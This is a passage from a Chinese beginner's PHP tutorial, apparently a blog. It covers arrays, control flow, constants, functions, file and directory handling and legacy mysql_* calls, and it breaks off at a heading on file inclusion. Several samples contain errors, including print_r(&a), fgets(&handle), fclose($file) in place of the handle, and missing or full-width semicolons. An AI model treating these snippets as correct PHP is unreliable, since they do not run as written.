class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr2</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">2</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr2</span>[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> sizeof(<span class="variable">$arr</span>);  <span class="comment">//返回数组的长度(元素的个数)</span></span><br><span class="line"><span class="keyword">echo</span> count(<span class="variable">$arr2</span>);  <span class="comment">//返回数组的长度(元素的个数)</span></span><br></pre></td></tr></table></figure><ul><li>关联数组  key为指定的值，通常为字符串</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$age</span> = <span class="keyword">array</span>(<span class="string">&#x27;bill&#x27;</span>=&gt;<span class="number">35</span>,<span class="string">&#x27;steve&#x27;</span>=&gt;<span class="number">37</span>,<span class="string">&#x27;peter&#x27;</span>=&gt;<span class="number">43</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;bill&#x27;</span>]  <span class="comment">//获取数组</span></span><br><span class="line"><span class="variable">$age</span>[<span class="number">0</span>] </span><br><span class="line"><span class="comment">//索引赋值</span></span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;bill&#x27;</span>]=<span class="number">35</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;steve&#x27;</span>]=<span class="number">37</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;peter&#x27;</span>]=<span class="number">43</span>;</span><br></pre></td></tr></table></figure><ul><li>多维数组</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;e&#x27;</span>,<span class="string">&quot;f&quot;</span>), </span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>][<span class="number">1</span>];  <span class="comment">//二维数组，输出= b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;e&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)), </span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">2</span>][<span class="number">1</span>][<span class="number">3</span>];<span class="comment">//多维数组，输出 = 4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="数组的基本操作"><a href="#数组的基本操作" class="headerlink" title="数组的基本操作"></a>数组的基本操作</h2><ul><li>通过赋值增加数组元素</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =<span class="keyword">array</span>(<span class="string">&quot;age&quot;</span>=&gt;<span class="string">&quot;25&quot;</span>)</span><br><span class="line"><span class="variable">$b</span>[<span class="string">&quot;name&quot;</span>]=<span class="string">&quot;bb&quot;</span>    </span><br></pre></td></tr></table></figure><ul><li>通过使用array_push()函数追加数组元素(入栈)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =<span class="keyword">array</span>(<span class="string">&quot;red&quot;</span>,<span class="string">&quot;green&quot;</span>);</span><br><span class="line">array_push(<span class="variable">$a</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;yellow&quot;</span>);</span><br><span class="line">print_r(&amp;a); <span class="comment">//打印所有数组出来</span></span><br></pre></td></tr></table></figure><ul><li>通过使用array_pop()函数删除最后一个数组元素出入栈)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =<span class="keyword">array</span>(<span class="string">&quot;red&quot;</span>,<span class="string">&quot;green&quot;</span>,<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">array_pop(<span class="variable">$a</span>);</span><br><span class="line">print_r(&amp;a); <span class="comment">//打印所有数组出来</span></span><br><span class="line"><span class="comment">//结果为 &quot;red&quot;,&quot;green&quot;</span></span><br></pre></td></tr></table></figure><ul><li>数组的排序</li></ul><table><thead><tr><th>排序函数</th><th>作用</th><th>属性</th></tr></thead><tbody><tr><td>sort()</td><td>以升序对数组排序</td><td>基本排序</td></tr><tr><td>rsort()</td><td>以降序对数组排序</td><td>基本排序</td></tr><tr><td>ksort()</td><td>根据键值，以升序对关联数组进行排序</td><td>键值排序</td></tr><tr><td>krsort()</td><td>根据键值，以降序对关联数组进行排序</td><td>键值排序</td></tr><tr><td>asort()</td><td>根据值，以升序对关联数组进行排序</td><td>值排序</td></tr><tr><td>arsort()</td><td>根据值，以降序对关联数组进行排序</td><td>值排序</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">10</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>);</span><br><span class="line"><span class="variable">$arr2</span> = sort(<span class="variable">$arr</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);    <span class="comment">//排序后在arr，不在arr2,arr2只会输出true、false</span></span><br></pre></td></tr></table></figure><h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2><ul><li><strong>if 语句</strong> - 在条件成立时执行代码</li><li><strong>if…else 语句</strong> - 在条件成立时执行一块代码，条件不成立时执行另一块代码</li><li><strong>if…elseif….else 语句</strong> - 在若干条件之一成立时执行一个代码块</li><li><strong>switch case 语句</strong> - 在若干条件之一成立时执行一个代码块</li></ul><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><ul><li><strong>while</strong> - 只要指定的条件成立，则循环执行代码块</li><li><strong>do…while</strong> - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</li><li><strong>for</strong> - 循环执行代码块指定的次数</li><li><strong>foreach($array as $value)</strong> - 根据数组中每个元素来循环代码块    ps：js里用的是 for in</li></ul><h2 id="PHP-常量"><a href="#PHP-常量" class="headerlink" title="PHP 常量"></a>PHP 常量</h2><ul><li><p>常量值被定义后，在脚本的其他任何地方都不能被改变。</p></li><li><p>常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</p></li><li><p>设置常量，使用 define() 函数，函数语法如下：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 区分大小写的常量名</span></span><br><span class="line">define(<span class="string">&quot;BB&quot;</span>, <span class="string">&quot;hello dashuaibi!&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> BB;    <span class="comment">// 输出 &quot;hello dashuaibi!&quot;  不需带$符号可直接调用</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> bb;   <span class="comment">// 报错</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 不区分大小写的常量名</span></span><br><span class="line">define(<span class="string">&quot;BB&quot;</span>, <span class="string">&quot;hello dashuaibi!&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> bb;   <span class="comment">// 不报错</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul><li>形参实参</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bb</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;    <span class="comment">//形参</span></span><br><span class="line">    <span class="variable">$m</span> = <span class="variable">$m</span> *<span class="number">5</span>+<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;在函数内：&quot;</span>.<span class="variable">$m</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="number">1</span>;            <span class="comment">//实参</span></span><br><span class="line">bb(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;在函数外：&quot;</span>.<span class="variable">$m</span>   </span><br></pre></td></tr></table></figure><ul><li>默认参数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bb</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$n</span>=<span class="string">&quot;1&quot;</span></span>)</span>&#123;    <span class="comment">//默认值参数</span></span><br><span class="line">    <span class="variable">$m</span> = <span class="variable">$m</span> +<span class="variable">$n</span>;</span><br><span class="line">&#125;</span><br><span class="line">bb(<span class="number">5</span>,<span class="number">6</span>); <span class="comment">//给两个可选参数赋值后，则覆盖参数默认值</span></span><br><span class="line">bb(<span class="number">5</span>);  <span class="comment">//没有给可选参数赋值，默认为1</span></span><br></pre></td></tr></table></figure><h2 id="自定全局变量"><a href="#自定全局变量" class="headerlink" title="自定全局变量"></a>自定全局变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line">    <span class="variable">$y</span>=<span class="number">10</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myfunction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$x</span>,<span class="variable">$y</span>;</span><br><span class="line">        <span class="variable">$y</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">myfunction();</span><br><span class="line"><span class="meta">?&gt;</span>      </span><br></pre></td></tr></table></figure><h2 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h2><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul><h2 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h2><table><thead><tr><th>函数</th><th>说明</th><th>语法</th></tr></thead><tbody><tr><td>strlen</td><td>计算字符串的长度</td><td>strlen(变量名)</td></tr><tr><td>substr</td><td>截取字符串，采用起点一长度方式</td><td>substr(string 源字符串,int start[,int length])</td></tr><tr><td>strstr</td><td>截取字符串，采用子串一结尾方式</td><td>strstr(string 原串，string标识)</td></tr><tr><td>explode</td><td>分割字符串，将字符串毁成数组</td><td>explode(string separator,string string [,int limit])</td></tr><tr><td>trim</td><td>去掉左右空格</td><td>trim (string 字符串)</td></tr><tr><td>md5</td><td>计算字符串的MD5哈希（加密）</td><td>md5 (string 字符串)</td></tr><tr><td>mb_strlen()</td><td>计算中文字符串的长度</td><td>strlen(变量名)</td></tr></tbody></table><p>参考：<a href="https://www.runoob.com/php/php-ref-string.html">https://www.runoob.com/php/php-ref-string.html</a></p><h2 id="常用变量函数"><a href="#常用变量函数" class="headerlink" title="常用变量函数"></a>常用变量函数</h2><table><thead><tr><th>类型</th><th>说明</th><th>语法</th></tr></thead><tbody><tr><td>empty</td><td>检查变量是否为空，为空返回true，否则为false</td><td>empty(变量)</td></tr><tr><td>gettype</td><td>获取变量的类型</td><td>gettype(变量)</td></tr><tr><td>is_array</td><td>检查变量是否为数组类型</td><td>is_array(变量)</td></tr><tr><td>isset</td><td>检查变量是否被设置或赋值</td><td>isset(变量)</td></tr><tr><td>unset</td><td>释放给定变量，即销毁变量</td><td>unset(变量)</td></tr><tr><td>var_dump</td><td>打印变量的相关信息</td><td>var_dump(变量)</td></tr></tbody></table><h2 id="时间日期函数"><a href="#时间日期函数" class="headerlink" title="时间日期函数"></a>时间日期函数</h2><table><thead><tr><th>函数</th><th>说明</th><th>语法</th></tr></thead><tbody><tr><td>checkdate</td><td>验证日期的有效性</td><td>checkdate(1,1,2022)</td></tr><tr><td>date</td><td>格式化一个本地时间/日期</td><td>date(Y-m-d H:i:s)</td></tr></tbody></table><p>参考：<a href="https://www.runoob.com/php/php-ref-date.html">https://www.runoob.com/php/php-ref-date.html</a></p><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><ul><li><p>关键字class开头</p></li><li><p>类是抽象的对象，对象是具体化的类。</p></li><li><p>可理解为类是带参数的对象，是一个空白的对象模板。</p></li><li><p>人类是一个类，比尔盖茨则是一个对象。</p></li><li><p>类有属性(变量) 和方法(函数)</p></li><li><p>代码重复使用、灵活性强，减少代码重复臃肿，提高执行效率。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span></span>&#123;       <span class="comment">//创建一个类  *没有()！！！！</span></span><br><span class="line">    <span class="keyword">var</span>  <span class="variable">$name</span>;           <span class="comment">//类属性</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;my name is&#x27;</span>.<span class="keyword">$this</span>-&gt;name;<span class="comment">// *this</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ps : $this关键字是用来访问当前对象中的对象属性和方法的系统变量,记住就好。</p><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><ul><li>用new从类中实例化一个对象</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xm</span> = <span class="keyword">new</span> person; <span class="comment">//实例化对象</span></span><br><span class="line"><span class="variable">$xm</span> -&gt;name = <span class="string">&#x27;大帅比&#x27;</span>; <span class="comment">//对对象属性进行赋值</span></span><br><span class="line"><span class="variable">$xm</span> -&gt;say();     <span class="comment">//访问对象的方法</span></span><br></pre></td></tr></table></figure><h2 id="php文件读取"><a href="#php文件读取" class="headerlink" title="php文件读取"></a>php文件读取</h2><table><thead><tr><th>操作步骤</th><th>函数名称</th><th>作用</th></tr></thead><tbody><tr><td>打开文件1</td><td>fopen()</td><td>打开文件</td></tr><tr><td>文件读取2</td><td>fread()</td><td>读取文件指定长度的字符串</td></tr><tr><td>文件读取3</td><td>fgets()</td><td>读取文件一行内容</td></tr><tr><td>文件读取4</td><td>feof()</td><td>检测是否已经到达文件末尾</td></tr><tr><td>文件写入5</td><td>fwrite()</td><td>写入数据</td></tr><tr><td>关闭文件6</td><td>fclose()</td><td>关闭文件</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;c:\\data\\info.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);   <span class="comment">//r 只读  w 写入 a 追加写入</span></span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;/home/file.gif&quot;</span>,<span class="string">&quot;wb&quot;</span>);    </span><br></pre></td></tr></table></figure><ul><li><p>打开文件常用函数</p><table><thead><tr><th>fopen()参数</th><th>说明</th></tr></thead><tbody><tr><td>r</td><td>以只读的方式打开，如果文件不存在将出错</td></tr><tr><td>w</td><td>以写入的方式打开，将文件指针指向文件头部，并删除文件内容，如果文件不存在则创建</td></tr><tr><td>a</td><td>以追加写入的方式打开，将文件指针指向文件末尾，如果文件不存在则创建</td></tr><tr><td>r+</td><td>以读写的方式(先读后写)打开，将文件指针指向文件头部</td></tr><tr><td>w+</td><td>以读写的方式打开，将文件指针指向文件头部，并删除文件内容</td></tr><tr><td>a+</td><td>以追加读写的方式打开，将文件指针指向文件末尾</td></tr><tr><td>x</td><td>以只写的方式创建并打开文件，并将文件指针指向文件头，如果文件存在，就会打开失败</td></tr><tr><td>x+</td><td>以读写的方式创建并打开文件，并将文件指针指向文件头。如果指定文件存在，就会打开失败</td></tr><tr><td>b</td><td>以二进制模式打开，可与r\w\a合用</td></tr></tbody></table></li><li><p>读取文件常用函数</p></li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>fread()</td><td>读取整个文件或文件中指定长度的字符串，可用于二进制文件读取</td></tr><tr><td>fgets()</td><td>读取文件中的一行字符</td></tr><tr><td>fgetss()</td><td>读取文件中的一行字符，并去掉所有html和php标记</td></tr><tr><td>fgetc()</td><td>读取文件中的一个字符</td></tr><tr><td>file_get_contents()</td><td>将文件读入字符串</td></tr><tr><td>file()</td><td>把文件读入到一个数组中</td></tr><tr><td>readfile()</td><td>读取整个文件或文件中指定长度的字符串，可用于二进制文件读取</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$file</span>,<span class="string">&#x27;r&#x27;</span>);       <span class="comment">//不能直接打开文件</span></span><br><span class="line"><span class="variable">$data</span> = fread(<span class="variable">$handle</span>,filesize(<span class="variable">$file</span>));  <span class="comment">//打开全部</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line">fclose(<span class="variable">$file</span>);    <span class="comment">//关闭文件操作</span></span><br></pre></td></tr></table></figure><ul><li>循环读取文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;hello.txt&quot;</span>;</span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$filename</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$handle</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(!feof(handle))    <span class="comment">//!取反  检测是否到达文件末尾，到达文件末尾为真，</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$line</span> = fgets(&amp;handle);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$line</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>；</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$filename</span> open failed&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="php文件写入"><a href="#php文件写入" class="headerlink" title="php文件写入"></a>php文件写入</h2><ul><li>fwrite()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;log.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;bb is dashuaibi!!&#x27;</span>;</span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$file</span>,<span class="string">&#x27;w&#x27;</span>);  <span class="comment">//or die (&#x27;cannot open file &#x27;.$file);</span></span><br><span class="line"><span class="variable">$write</span> = fwrite(<span class="variable">$handle</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$write</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;write successful!&#x27;</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;write failed!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$handle</span>);</span><br></pre></td></tr></table></figure><ul><li><p>file_get_contents()&amp;file_put_contents函数读写文件</p><p>无需打开文件关闭文件就可以操作读取写入</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;test.txt&quot;</span>);<span class="comment">//读文件</span></span><br><span class="line"><span class="keyword">echo</span> file_put_contents(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;内容&quot;</span>,FILE_APPEND);<span class="comment">//以追加方式写文件</span></span><br></pre></td></tr></table></figure> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;test.txt&#x27;</span>; </span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;bb is dashuaibi&#x27;</span>;</span><br><span class="line"><span class="variable">$write</span> = file_put_contents(<span class="variable">$file</span>,<span class="variable">$data</span>,FILE_APPEND); <span class="comment">//写文件,FILE_APPEND 追加模式</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$write</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;write successful!!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><ul><li>文件复制、移动删除的函数</li></ul><table><thead><tr><th>函数</th><th>语法</th><th>说明</th></tr></thead><tbody><tr><td>copy()</td><td>copy(源文件，目标文件)</td><td>复制文件</td></tr><tr><td>unlink()</td><td>unlink(目标文件)</td><td>删除文件</td></tr><tr><td>rename()</td><td>rename(旧文件名，新文件名)</td><td>重命名文件或目录，或移动文件</td></tr><tr><td>ftruncate()</td><td>ftruncate(目标文件资源，截取长度)</td><td>将文件截断到指定长度</td></tr><tr><td>file_exists</td><td>file_exists(目标文件名)</td><td>判断文件或文件夹是否存在</td></tr><tr><td>is_file()</td><td>is_file(文件名)</td><td>判断指定的路径存在且为文件</td></tr></tbody></table><ul><li>获取文件的属性</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>filesize()</td><td>只读，返回文件的大小</td></tr><tr><td>filetype()</td><td>只读，返回文件的类型，如文件文件夹</td></tr><tr><td>filectime()</td><td>返回文件创建的时间的时间戳</td></tr><tr><td>filemtime()</td><td>只读返回文件的修改时间</td></tr><tr><td>realpath()</td><td>返回文件的物理路径</td></tr><tr><td>pathinfo()</td><td>以数组形式返回文件的路径和文件名信息</td></tr></tbody></table><ul><li>目录的基本操作</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>mkdir(pathname)</td><td>新建一个指定的目录</td><td>mkdir(‘temp’)</td></tr><tr><td>rmdir(dirname)</td><td>删除目录，该目录必须为空</td><td>rmdir(‘data’)</td></tr><tr><td>getcwd(void)</td><td>取得当前文件所在的目录</td><td>echo getcwd();</td></tr><tr><td>chdir(dirname)</td><td>改变当前目录</td><td>chdir(‘…/‘);</td></tr><tr><td>opendir(path)</td><td>打开目录，返回目录的指针</td><td>$dirh=opendir(‘temp’);</td></tr><tr><td>closedir()</td><td>关闭目录，参数为目录指针</td><td>closedir($dirh);</td></tr><tr><td>readdir()</td><td>遍历目录</td><td>$file=readdir($dirh);</td></tr><tr><td>scandir(path,sort)</td><td>以数组形式便利目录，sort参数可设置升序或降序排列</td><td>$arr=scandir(‘D:\bb’1);</td></tr></tbody></table><h2 id="php-mysql操作"><a href="#php-mysql操作" class="headerlink" title="php mysql操作"></a>php mysql操作</h2><p>连接一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(host,name,pass)</span><br></pre></td></tr></table></figure><p>选择一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql_select_db(sqlname,<span class="variable">$conn</span>) ;  <span class="comment">//已被弃用</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,sqlname);  <span class="comment">//mysqli 和 mysql刚好相反！！！！！</span></span><br></pre></td></tr></table></figure><p>查询一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(SQL,connect)    </span><br></pre></td></tr></table></figure><p>输出一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql_fetch_array( mysql_query)  <span class="comment">#从结果集中取得一行作为枚举数组！--&gt;返回键值对数组</span></span><br><span class="line">mysql_fetch_row(mysql_query)   <span class="comment">#从结果集中取得一行作为枚举数组！--&gt;返回下标数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array( mysql_query))&#123;   <span class="comment">//正确取值,如果按变量赋值则陷入死循环.</span></span><br><span class="line">    <span class="comment">//代码块</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_num_rows (mysql_query)  <span class="comment">#获取由select语句查询到的结果集中行的数目</span></span><br></pre></td></tr></table></figure><h2 id="php-文件包含"><a href="#php-文件包含" 